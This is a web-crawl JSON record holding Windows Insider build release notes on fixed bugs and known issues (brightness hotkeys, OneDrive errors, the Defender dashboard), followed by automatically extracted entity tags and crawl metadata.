We’ve updated the full screen Settings search results to now use smaller icons – we feel this delivers an overall more polished feel, as well as enables more search results to display on the page at a time. We fixed an issue where some notifications might draw too high or too low, and then be seen moving itself to the correct position. We fixed an issue where the outline incoming notification toasts could still be seen if notification banners as a whole for that particular app had been turned off. We fixed an issue Insiders may have experienced where the Favorites bar on desktop might appear empty, despite having items in the Favorites folder. We fixed an issue that could result in CPU throttling when idling on certain webpages with many gifs or looping videos in Microsoft Edge. We fixed an issue that could result in Alt + D sometimes not being able to set focus to the address bar in Microsoft Edge. For Insiders with PCs that upgraded to builds 14926-14959, some default power settings may have been lost and not recovered on subsequent upgrades. The effect of this causes devices to potentially use more power, change the power button behavior on tablets, etc. Starting with 14986, an attempt to detect this issue and re-apply the power settings will be made during upgrade. This attempt is a temporary process to help address this issue for Insiders, and will be removed once we’re closer to the Creators Update release. We’ve heard your feedback, and updated our Windows Error Reporting logic so that uploading crash data should no longer interfere with online game play, video streaming, Skype calls, or other network-intensive activity. Please keep an eye out for this if you experience any crashes and let us know how it goes. We fixed an issue resulting in Microsoft Studios games like Microsoft Sudoku, Jigsaw, Minesweeper, Taptiles, and Treasure Hunt potentially freezing at the splash screen on launch. We fixed an issue where, if the taskbar location was set to be on top, it was visible on the Welcome screens after upgrading. WHAT’S BROKEN. \nWhat’s broken Using keyboard monitor hotkeys to adjust brightness won’t work as expected. Desired brightness change could be done via the Action Center or by going to Settings > System > Display. You may see a popup “Catastrophic Error” dialog when opening OneDrive folders. If you do, the workaround is to open an elevated Command Prompt or PowerShell window and enter “attrib -O <path to OneDrive failure that resulted in the error dialog>”. We’re currently investigating reports that DirectAccess isn’t working for some Windows Insiders. When using Microsoft Edge with Narrator, you may hear “no item in view or silence when tabbing or using other navigation commands. You can use Alt + Tab when this happens to move focus away from and back to the Edge browser and then Narrator will read as expected. Hey Cortana, play <blah> on <AppName> doesn’t work immediately after installing the app. Wait 5 minutes for indexer to kick in and try again. Currently, the Windows Defender dashboard is primarily aimed at providing some minimal read-only status for Antivirus/Firewall, with some very limited functionality for interacting with the app. Here are some of the known issues with the dashboard to be aware of (not a comprehensive list): Doesn’t accurately roll up status of Pillars Doesn’t accurately show status when a 3P AV is on the machine. History is not yet available in the new app Advanced/Custom scans are not yet available in the new app Settings are not configurable through the new app Firewall control panel not launchable from new app Firewall settings are not configurable through the new app ",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "tom clancy",
            "sentiment": "none"
          },
          {
            "name": "nelson",
            "sentiment": "none"
          },
          {
            "name": "cortana",
            "sentiment": "none"
          },
          {
            "name": "isaac the witcher",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "max mafia",
            "sentiment": "none"
          },
          {
            "name": "action center",
            "sentiment": "none"
          },
          {
            "name": "skype",
            "sentiment": "none"
          },
          {
            "name": "improve recognition",
            "sentiment": "none"
          },
          {
            "name": "msa",
            "sentiment": "none"
          },
          {
            "name": "intel",
            "sentiment": "none"
          },
          {
            "name": "sdk",
            "sentiment": "none"
          },
          {
            "name": "tunein radio",
            "sentiment": "none"
          },
          {
            "name": "treasure hunt",
            "sentiment": "none"
          },
          {
            "name": "nba",
            "sentiment": "none"
          },
          {
            "name": "handwriting panel",
            "sentiment": "none"
          },
          {
            "name": "microsoft pinyin ime",
            "sentiment": "none"
          },
          {
            "name": "asio",
            "sentiment": "none"
          },
          {
            "name": "ime",
            "sentiment": "none"
          },
          {
            "name": "microsoft studios",
            "sentiment": "none"
          },
          {
            "name": "arma",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "united states",
            "sentiment": "none"
          },
          {
            "name": "jigsaw",
            "sentiment": "none"
          },
          {
            "name": "taskbar",
            "sentiment": "none"
          },
          {
            "name": "cortana",
            "sentiment": "none"
          },
          {
            "name": "ebates",
            "sentiment": "none"
          },
          {
            "name": "netease",
            "sentiment": "none"
          },
          {
            "name": "asia",
            "sentiment": "none"
          },
          {
            "name": "asia along",
            "sentiment": "none"
          },
          {
            "name": "china",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-08T02:17:59.204+02:00"
    }
  ],
  "totalResults": 40,
  "moreResultsAvailable": 0,
  "next": "/search?token=c6052904-f312-436b-a6d8-d915084ac866&format=json&ts=1481156279204&q=language%3A%28english%29+thread.country%3AUS+organization.neutral%3A%22Microsoft%22",
  "requestsLeft": 525
}
